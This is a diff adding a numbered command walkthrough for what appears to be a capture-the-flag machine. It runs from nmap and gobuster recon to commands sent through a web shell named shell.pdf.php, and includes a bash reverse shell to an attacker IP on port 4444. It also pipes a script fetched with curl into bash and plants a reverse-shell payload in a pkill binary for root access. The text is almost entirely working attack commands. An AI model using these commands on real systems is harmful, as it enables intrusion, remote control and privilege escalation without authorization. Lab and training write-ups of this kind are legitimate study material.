@@ -1,0 +1,13 @@
+1 - nmap -A 10.10.2.24
+2 - gobuster dir -u http://10.10.2.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - http://10.10.2.24/cvs/shell.pdf.php?cmd=cat /home/lachlan/user.txt
+4 - nano shell.sh
+bash -i >& /dev/tcp/10.8.94.51/4444 0>&1
+
+5 - http://10.10.2.24/cvs/shell.pdf.php?cmd=curl http://10.8.94.51:8000/shell.sh | bash
+6 - cat /home/lachlan/.bash_history
+7 - su lachlan
+8 - echo "bash -c 'bash -i >& /dev/tcp/10.8.94.51/4445 0>&1'" > /home/lachlan/bin/pkill
+9 - chmod +x /home/lachlan/bin/pkill
+10 - whoami
+11 - cat /root/root.txt
